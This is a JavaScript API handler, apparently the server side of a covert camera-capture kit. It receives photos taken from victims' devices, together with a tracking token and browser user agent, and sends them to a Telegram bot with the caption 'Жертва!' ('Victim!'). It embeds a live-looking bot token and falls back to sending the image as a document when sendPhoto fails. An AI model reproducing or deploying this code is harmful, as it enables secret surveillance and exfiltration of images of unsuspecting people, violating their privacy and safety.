import formidable from 'formidable';
import fs from 'fs';

export const config = {
    api: {
        bodyParser: false,
    },
};

const BOT_TOKEN = "8255755052:AAFjHxgUKDccQVi33kWGuUXkARcR85CxXDQ";

// Здесь должны храниться токены и соответствующие chat_id
// В реальном проекте используй БД
const tokenOwners = {
    // Будет заполняться из бота
};

export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    try {
        const form = formidable({ multiples: false });
        
        const [fields, files] = await new Promise((resolve, reject) => {
            form.parse(req, (err, fields, files) => {
                if (err) reject(err);
                resolve([fields, files]);
            });
        });

        const imageFile = files.image;
        const token = fields.token?.[0];
        const ua = fields.ua?.[0] || 'Unknown';

        if (!imageFile || !token) {
            return res.status(400).json({ error: 'Missing data' });
        }

        console.log(`📸 Получено фото для токена: ${token}`);

        // Читаем файл как base64
        const imageData = fs.readFileSync(imageFile.filepath);
        const base64Image = imageData.toString('base64');
        
        // Создаем FormData для отправки в Telegram
        const formData = new FormData();
        
        // ВАЖНО: здесь нужно указать правильный chat_id владельца токена
        // В реальности chat_id нужно получать из базы данных по токену
        // Для теста отправляем на известный chat_id
        const targetChatId = fields.target_chat_id || '8255755052'; // Замени на реальный chat_id
        
        formData.append('chat_id', targetChatId);
        formData.append('photo', new Blob([imageData]), 'photo.jpg');
        formData.append('caption', `📸 Жертва!\n🕒 ${new Date().toLocaleString()}\n📱 ${ua}`);

        console.log('📤 Отправка в Telegram...');

        const tgResponse = await fetch(
            `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
            {
                method: 'POST',
                body: formData
            }
        );

        const tgData = await tgResponse.json();
        
        if (!tgResponse.ok) {
            console.error('Telegram API error:', tgData);
            
            // Пробуем отправить как документ
            const docFormData = new FormData();
            docFormData.append('chat_id', targetChatId);
            docFormData.append('document', new Blob([imageData]), 'photo.jpg');
            docFormData.append('caption', `📸 Жертва!\nТокен: ${token}`);
            
            const docResponse = await fetch(
                `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`,
                { method: 'POST', body: docFormData }
            );
            
            if (!docResponse.ok) {
                throw new Error('Failed to send as document too');
            }
        }

        console.log('✅ Фото отправлено в Telegram');

        // Удаляем временный файл
        fs.unlinkSync(imageFile.filepath);
        
        res.status(200).json({ success: true });

    } catch (error) {
        console.error('❌ Capture error:', error);
        res.status(500).json({ error: error.message });
    }
}
